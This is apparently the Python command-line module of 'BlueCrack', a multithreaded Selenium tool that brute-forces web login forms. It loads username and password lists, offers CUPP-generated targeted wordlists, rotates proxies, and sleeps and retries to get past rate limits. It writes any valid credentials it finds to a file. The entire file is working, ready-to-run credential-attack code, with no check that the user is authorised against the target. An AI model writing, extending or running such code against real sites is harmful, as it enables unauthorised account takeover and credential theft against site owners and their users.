"""
BlueCrack CLI Attack Module
============================
Brute-force attack controller for CLI and Interactive Wizard modes.
"""

import sys
import os
import random
import time
import signal
import threading
import argparse
from queue import Queue
from typing import Any, Dict, List, Optional, Set, Tuple

from selenium import webdriver
from selenium.common.exceptions import (
    NoSuchElementException,
    WebDriverException,
)
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys

from .constants import (
    CSS_PATH_JS,
    AUTO_DETECT_JS,
    CLICK_LISTENER_JS,
    HAS_KEYBOARD,
    _GREEN,
    _RED,
    _YELLOW,
    _CYAN,
    _BLUE,
    _RESET,
    _BOLD,
)
from .utils import (
    build_chrome_options,
    create_driver_safe,
    change_tor_ip,
    save_json_report,
)

if HAS_KEYBOARD:
    try:
        import keyboard
    except ImportError:
        pass


def run_attack_cli(args: argparse.Namespace) -> None:
    """Run CLI credential auditing engine."""
    _GLOBAL_STOP: threading.Event = threading.Event()
    _FOUND_EVENT: threading.Event = threading.Event()

    def _signal_handler(sig: int, frame: Any) -> None:
        """Handle Ctrl+C / Ctrl+X for graceful shutdown."""
        print(f"\n{_YELLOW}[!] Caught Ctrl+C / Ctrl+X — stopping gracefully...{_RESET}")
        _GLOBAL_STOP.set()
        _FOUND_EVENT.set()

    # Save original signal handler, register ours, restore on exit
    old_sig = signal.signal(signal.SIGINT, _signal_handler)

    try:
        # INTERACTIVE MODE
        auto_detect = False
        if args.interactive:
            print(f"\n{_CYAN}--- WIZARD MODE ---{_RESET}")

            # CUPP Integration
            run_cupp = (
                input("\nGenerate a targeted wordlist first using CUPP? (y/n) [default: n]: ")
                .strip()
                .lower()
                == "y"
            )
            if run_cupp:
                print(
                    f"\n{_YELLOW}--- LAUNCHING CUPP (Common User Passwords Profiler) ---{_RESET}"
                )
                os.system(f"{sys.executable} -m bluecrack.vendor.cupp -i")
                print(
                    f"\n{_GREEN}[+] CUPP completed! Make sure to remember the saved filename.{_RESET}\n"
                )

            args.url = input("\nEnter Target URL: ").strip()
            args.username = (
                input("Enter single username to test (leave blank to skip): ").strip() or None
            )
            if not args.username:
                args.userfile = input("Enter path to usernames list file: ").strip() or None

            # Get password approach correctly in wizard
            single_pass = input("Enter single password to test (leave blank to skip): ").strip()
            if single_pass:
                args.password = single_pass
                args.passfile = None
            else:
                args.password = None
                args.passfile = input("Enter path to passwords list file: ").strip() or None

            threads_in_str = input("Enter number of threads [default: 1]: ").strip()
            args.threads = int(threads_in_str) if threads_in_str.isdigit() else 1

            err_in_str = input("Enter error string to check (default: empty): ").strip()
            if err_in_str:
                args.error = err_in_str

            succ_in_str = input("Enter success string to check (default: empty): ").strip()
            if succ_in_str:
                args.success = succ_in_str

            delay_in_str = input(
                "Enter general delay between attempts in seconds [default: 0]: "
            ).strip()
            args.delay = (
                float(delay_in_str) if delay_in_str.replace(".", "", 1).isdigit() else 0.0
            )

            jitter_in_str = input(
                "Enter jitter/randomizer up to X seconds [default: 0.0]: "
            ).strip()
            args.jitter = (
                float(jitter_in_str) if jitter_in_str.replace(".", "", 1).isdigit() else 0.0
            )

            use_proxy = input("Use proxy? (y/n) [default: n]: ").strip().lower() == "y"
            if use_proxy:
                p_file = input(
                    "Enter path to proxy list file (or hit enter to use single proxy): "
                ).strip()
                if p_file:
                    args.proxyfile = p_file
                else:
                    args.proxy = input(
                        "Enter proxy IP:PORT (e.g., http://1.2.3.4:8080): "
                    ).strip()

            rl_bypass = (
                input("Enable Auto-Throttle for Rate Limits? (y/n) [default: y]: ")
                .strip()
                .lower()
                != "n"
            )
            args.cooldown = 12 if rl_bypass else 0
            if rl_bypass:
                rl_text = input(
                    "Enter Rate Limit text to detect [default: 'too many requests']: "
                ).strip()
                if rl_text:
                    args.limit_text = rl_text

            max_att_str = input("Max attempts (0=unlimited) [default: 0]: ").strip()
            args.max_attempts = int(max_att_str) if max_att_str.isdigit() else 0

            cont_str = input(
                "Continue testing after finding credentials? (y/n) [default: n]: "
            ).strip().lower()
            args.continue_after_success = cont_str == "y"

            auto_detect = (
                input("Auto-detect CSS selectors instead of clicking? (y/n) [default: y]: ")
                .strip()
                .lower()
                != "n"
            )
        else:
            auto_detect = False
            if not args.url:
                raise SystemExit(f"{_RED}[-] Provide --url or use -i wizard{_RESET}")

        if not args.username and not args.userfile:
            raise SystemExit(f"{_RED}[-] Provide -u USER or -U USERFILE{_RESET}")

        if not args.password and not args.passfile:
            raise SystemExit(f"{_RED}[-] Provide -p PASS or -P PASSLIST{_RESET}")

        # LOAD USERNAMES
        users: List[str] = []
        if args.username:
            users.append(args.username)
        if args.userfile:
            with open(args.userfile, "r", encoding="utf-8", errors="ignore") as f:
                for line in f:
                    users.append(line.strip())

        # LOAD PASSWORDS
        passwords: List[str] = []
        if args.password:
            passwords.append(args.password)
        if args.passfile:
            with open(args.passfile, "r", encoding="utf-8", errors="ignore") as f:
                for line in f:
                    px = line.strip()
                    if px:
                        passwords.append(px)

        # LOAD PROXIES
        proxies: List[str] = []
        if args.proxy:
            proxies.append(args.proxy)
        if args.proxyfile:
            with open(args.proxyfile, "r", encoding="utf-8", errors="ignore") as f:
                for line in f:
                    if line.strip():
                        proxies.append(line.strip())

        USERNAME_FIXED: Optional[str] = users[0] if len(users) == 1 else None
        WORDLIST: str = f"{len(passwords)} passwords loaded for {len(users)} users"
        PROXY_INFO: str = f"{len(proxies)} proxies loaded" if proxies else "No Proxies"

        THREADS: int = args.threads
        TARGET_URL: str = args.url
        if (
            TARGET_URL
            and not TARGET_URL.startswith("http://")
            and not TARGET_URL.startswith("https://")
        ):
            TARGET_URL = "http://" + TARGET_URL

        ERROR_MSG: Optional[str] = args.error.lower() if args.error else None
        SUCCESS_MSG: Optional[str] = args.success.lower() if args.success else None
        LIMIT_TEXT: Optional[str] = args.limit_text.lower() if args.limit_text else None
        COOLDOWN: int = args.cooldown
        DELAY: float = args.delay
        JITTER: float = args.jitter
        RUN_HEADLESS: bool = args.headless
        MAX_ATTEMPTS: int = args.max_attempts
        CONTINUE_AFTER_SUCCESS: bool = args.continue_after_success
        OUTPUT_FILE: str = args.output
        JSON_REPORT: bool = args.json_report

        # LAUNCH SELENIUM (setup browser)
        driver = webdriver.Chrome()
        driver.get(TARGET_URL)

        username_selector: Optional[str] = None
        password_selector: Optional[str] = None

        print("\n==============================")
        print("   BROWSER BRUTE TESTER")
        print("==============================\n")
        print(f"Target URL: {TARGET_URL}")
        print(f"User: {USERNAME_FIXED}")
        print(f"Wordlist: {WORDLIST}")
        print(f"Proxies: {PROXY_INFO}")
        print(f"Threads: {THREADS}")
        print(f"Delay/Jitter: {DELAY}s / {JITTER}s")
        if MAX_ATTEMPTS > 0:
            print(f"Max Attempts: {MAX_ATTEMPTS}")
        if CONTINUE_AFTER_SUCCESS:
            print(f"{_CYAN}[*] Will continue after finding credentials{_RESET}")

        # Inject JS to track last clicked element
        driver.execute_script(CLICK_LISTENER_JS)

        # GENERATE CSS SELECTOR FROM CLICKED ELEMENT
        def get_css_selector() -> Optional[str]:
            elem = driver.execute_script("return window._lastClicked")
            if elem is None:
                return None
            return driver.execute_script(CSS_PATH_JS, elem)

        if auto_detect:
            print(f"\n{_CYAN}[*] Auto-detecting login form fields...{_RESET}")
            time.sleep(2)
            try:
                driver.execute_script(AUTO_DETECT_JS)
                detected_selectors = driver.execute_script("return window._autoFindFields();")
                if detected_selectors and detected_selectors[0] and detected_selectors[1]:
                    username_selector, password_selector = detected_selectors
                    print(f"{_GREEN}[+] AUTO-DETECTED Username: {username_selector}{_RESET}")
                    print(f"{_GREEN}[+] AUTO-DETECTED Password: {password_selector}{_RESET}")
                else:
                    print(f"{_RED}[-] Auto-detect failed. Please lock manually.{_RESET}")
                    auto_detect = False
            except Exception as e:
                print(
                    f"{_RED}[-] Auto-detect script failed: {e}. Switching to manual mode.{_RESET}"
                )
                auto_detect = False

        # WAIT FOR USER TO LOCK FIELDS
        if not auto_detect:
            print(f"\n{_CYAN}[>] CLICK username field → press S{_RESET}")
            print(f"{_CYAN}[>] CLICK password field → press T{_RESET}")
            print(f"{_CYAN}[>] Press ENTER to start brute{_RESET}\n")

            if not HAS_KEYBOARD:
                raise SystemExit(f"{_RED}[-] keyboard library not available. Auto-detect failed and manual override requires keyboard library.{_RESET}")

            while username_selector is None or password_selector is None:
                if keyboard.is_pressed("s"):
                    css = get_css_selector()
                    if css:
                        username_selector = css
                        print(f"{_BLUE}[+] Username selector LOCKED: {css}{_RESET}")
                    time.sleep(0.3)
                if keyboard.is_pressed("t"):
                    css = get_css_selector()
                    if css:
                        password_selector = css
                        print(f"{_BLUE}[+] Password selector LOCKED: {css}{_RESET}")
                    time.sleep(0.3)

        print("\nSelectors locked! Press ENTER to launch brute...")

        # TEST THE SELECTORS IMMEDIATELY
        driver.find_element(By.CSS_SELECTOR, username_selector)
        driver.find_element(By.CSS_SELECTOR, password_selector)

        if HAS_KEYBOARD:
            keyboard.wait("enter")
        else:
            time.sleep(1)

        # Close the initial setup driver
        try:
            driver.quit()
        except Exception:
            pass

        # LOAD WORDLIST INTO QUEUE
        q: Queue = Queue(maxsize=1000)
        total_combos: int = len(users) * len(passwords)

        # CLI metrics
        _cli_metrics: Dict[str, int] = {
            "attempted": 0,
            "successes": 0,
            "failures": 0,
            "errors": 0,
            "rate_limit_hits": 0,
            "skipped_empty": 0,
            "requeued": 0,
        }
        _cli_metrics_lock = threading.Lock()
        _cli_found_creds: List[Tuple[str, str]] = []
        _cli_found_creds_lock = threading.Lock()
        _cli_found_users: Set[str] = set()
        _cli_found_users_lock = threading.Lock()
        _cli_start_time: float = time.time()

        def populate() -> None:
            for user in users:
                for pwd in passwords:
                    q.put((user, pwd))

        threading.Thread(target=populate, daemon=True).start()

        # WORKER FUNCTION
        def worker() -> None:
            ctx: Dict[str, Any] = {
                "headless": RUN_HEADLESS,
                "proxies": proxies,
                "use_tor": False,
            }
            options = build_chrome_options(ctx)
            thread_driver = create_driver_safe(options)
            if thread_driver is None:
                print(f"{_RED}[-] Thread startup error: could not create WebDriver{_RESET}")
                return

            try:
                while not q.empty() and not _FOUND_EVENT.is_set() and not _GLOBAL_STOP.is_set():
                    # Check max attempts
                    if MAX_ATTEMPTS > 0:
                        with _cli_metrics_lock:
                            if _cli_metrics["attempted"] >= MAX_ATTEMPTS:
                                break

                    # Check if we should stop (non-continue mode)
                    if not CONTINUE_AFTER_SUCCESS and _FOUND_EVENT.is_set():
                        break

                    try:
                        user, pwd = q.get(timeout=1)
                    except Exception:
                        break

                    # Skip empty passwords
                    if not pwd or str(pwd).strip() == "":
                        with _cli_metrics_lock:
                            _cli_metrics["skipped_empty"] += 1
                        q.task_done()
                        continue

                    # Skip already solved users (unless continue mode)
                    if not CONTINUE_AFTER_SUCCESS:
                        with _cli_found_users_lock:
                            if user in _cli_found_users:
                                q.task_done()
                                continue

                    try:
                        if _FOUND_EVENT.is_set() and not CONTINUE_AFTER_SUCCESS:
                            break
                        if _GLOBAL_STOP.is_set():
                            break

                        # Add delay if configured
                        actual_delay: float = DELAY
                        if JITTER > 0.0:
                            actual_delay += random.uniform(0, JITTER)

                        if actual_delay > 0.0:
                            for _ in range(int(actual_delay * 10)):
                                if _FOUND_EVENT.is_set() and not CONTINUE_AFTER_SUCCESS:
                                    break
                                time.sleep(0.1)

                        if (_FOUND_EVENT.is_set() and not CONTINUE_AFTER_SUCCESS) or _GLOBAL_STOP.is_set():
                            break

                        thread_driver.get(TARGET_URL)
                        if (_FOUND_EVENT.is_set() and not CONTINUE_AFTER_SUCCESS) or _GLOBAL_STOP.is_set():
                            break

                        try:
                            u = thread_driver.find_element(By.CSS_SELECTOR, username_selector)
                            p = thread_driver.find_element(By.CSS_SELECTOR, password_selector)
                            u.clear()
                            u.send_keys(user)
                            p.clear()
                            p.send_keys(pwd)
                            p.send_keys(Keys.ENTER)

                            with _cli_metrics_lock:
                                _cli_metrics["attempted"] += 1
                                attempt_num = _cli_metrics["attempted"]

                            if (_FOUND_EVENT.is_set() and not CONTINUE_AFTER_SUCCESS) or _GLOBAL_STOP.is_set():
                                break

                            print(
                                f"[{attempt_num}/{total_combos}] {_CYAN}[*]{_RESET} Trying: {user} / {pwd}"
                            )

                            # Wait for login to process
                            for _ in range(20):
                                if _FOUND_EVENT.is_set() and not CONTINUE_AFTER_SUCCESS:
                                    break
                                time.sleep(0.1)

                            if (_FOUND_EVENT.is_set() and not CONTINUE_AFTER_SUCCESS) or _GLOBAL_STOP.is_set():
                                break

                            # Check page
                            page_source: str = thread_driver.page_source.lower()
                            current_url: str = thread_driver.current_url

                            # Check for rate limiting first
                            if LIMIT_TEXT and LIMIT_TEXT in page_source:
                                print(
                                    f"[{attempt_num}/{total_combos}] {_YELLOW}[!] Rate Limit detected ('{LIMIT_TEXT}')!{_RESET}"
                                )
                                with _cli_metrics_lock:
                                    _cli_metrics["rate_limit_hits"] += 1
                                if COOLDOWN > 0:
                                    print(
                                        f"{_CYAN}[~] Bypassing... Sleeping {COOLDOWN} seconds before retrying {user}/{pwd}{_RESET}"
                                    )
                                    for _ in range(COOLDOWN * 10):
                                        if _FOUND_EVENT.is_set() and not CONTINUE_AFTER_SUCCESS:
                                            break
                                        time.sleep(0.1)
                                    if not _FOUND_EVENT.is_set() or CONTINUE_AFTER_SUCCESS:
                                        q.put((user, pwd))
                                        with _cli_metrics_lock:
                                            _cli_metrics["requeued"] += 1
                                else:
                                    print(
                                        f"{_RED}[-] Rate limit hit, skipping {user}/{pwd}...{_RESET}"
                                    )
                                q.task_done()
                                continue

                            # Check explicit error
                            if ERROR_MSG and ERROR_MSG in page_source:
                                with _cli_metrics_lock:
                                    _cli_metrics["failures"] += 1
                                q.task_done()
                                continue

                            # Determine success
                            is_success = False
                            if SUCCESS_MSG:
                                if SUCCESS_MSG in page_source:
                                    is_success = True
                                else:
                                    with _cli_metrics_lock:
                                        _cli_metrics["failures"] += 1
                                    q.task_done()
                                    continue
                            elif current_url != TARGET_URL and "login" not in current_url.lower():
                                is_success = True
                            elif ERROR_MSG:
                                is_success = True

                            if is_success:
                                print(
                                    f"\n{_GREEN}{_BOLD}[+] VALID CREDENTIALS FOUND: {user} / {pwd}{_RESET}\n"
                                )
                                with _cli_metrics_lock:
                                    _cli_metrics["successes"] += 1
                                with _cli_found_creds_lock:
                                    _cli_found_creds.append((user, pwd))
                                with _cli_found_users_lock:
                                    _cli_found_users.add(user)

                                try:
                                    with open(OUTPUT_FILE, "a", encoding="utf-8") as cf:
                                        cf.write(f"{TARGET_URL} - {user}:{pwd}\n")
                                except Exception as e:
                                    print(f"{_RED}[-] Could not save credential: {e}{_RESET}")

                                if not CONTINUE_AFTER_SUCCESS:
                                    _FOUND_EVENT.set()
                                    with q.mutex:
                                        q.queue.clear()
                                    q.task_done()
                                    break
                            else:
                                with _cli_metrics_lock:
                                    _cli_metrics["failures"] += 1

                        except (NoSuchElementException, WebDriverException) as e:
                            with _cli_metrics_lock:
                                _cli_metrics["errors"] += 1
                            print(
                                f"{_RED}[-] Error during attempt with '{user} / {pwd}': element not found or page load issue.{_RESET}"
                            )
                    except Exception as e:
                        with _cli_metrics_lock:
                            _cli_metrics["errors"] += 1
                        print(f"{_RED}[-] Navigation or unexpected error: {e}{_RESET}")
                    finally:
                        q.task_done()
            finally:
                try:
                    thread_driver.quit()
                except Exception:
                    pass

        # THREAD LAUNCHER
        threads_list: List[threading.Thread] = []
        print(f"\n[*] Starting {THREADS} threads...\n")
        try:
            for _ in range(THREADS):
                t = threading.Thread(target=worker)
                t.daemon = True
                t.start()
                threads_list.append(t)

            # Wait for completion
            while not q.empty() and not _FOUND_EVENT.is_set() and not _GLOBAL_STOP.is_set():
                time.sleep(0.1)

            if not _FOUND_EVENT.is_set():
                q.join()

            cli_end_time = time.time()

            if not _FOUND_EVENT.is_set():
                print(f"\n{_RED}[-] Finished testing. No valid credentials found.{_RESET}")
            else:
                print(f"\n{_GREEN}[+] Finished testing. Valid credentials found!{_RESET}")

            # Print summary
            print(f"\n{_CYAN}═══ Attack Summary ═══{_RESET}")
            for k, v in _cli_metrics.items():
                print(f"  {k}: {v}")
            elapsed = cli_end_time - _cli_start_time
            print(f"  elapsed: {elapsed:.1f}s")
            if _cli_metrics["attempted"] > 0 and elapsed > 0:
                print(f"  speed: {_cli_metrics['attempted'] / elapsed:.1f} attempts/s")

            # Save JSON report if requested
            if JSON_REPORT:
                save_json_report(
                    "bluecrack_cli_report.json",
                    TARGET_URL,
                    _cli_metrics,
                    _cli_found_creds,
                    _cli_start_time,
                    cli_end_time,
                )
                print(f"{_GREEN}[+] JSON report saved to bluecrack_cli_report.json{_RESET}")

        except KeyboardInterrupt:
            print(f"\n{_YELLOW}[!] Interrupted by user (Ctrl+C). Exiting gracefully...{_RESET}")
            _FOUND_EVENT.set()
            _GLOBAL_STOP.set()
        finally:
            if _GLOBAL_STOP.is_set() and not _FOUND_EVENT.is_set():
                print(f"\n{_YELLOW}[!] Stopped by signal. Cleaning up...{_RESET}")

    finally:
        # Restore original signal handler
        signal.signal(signal.SIGINT, old_sig)
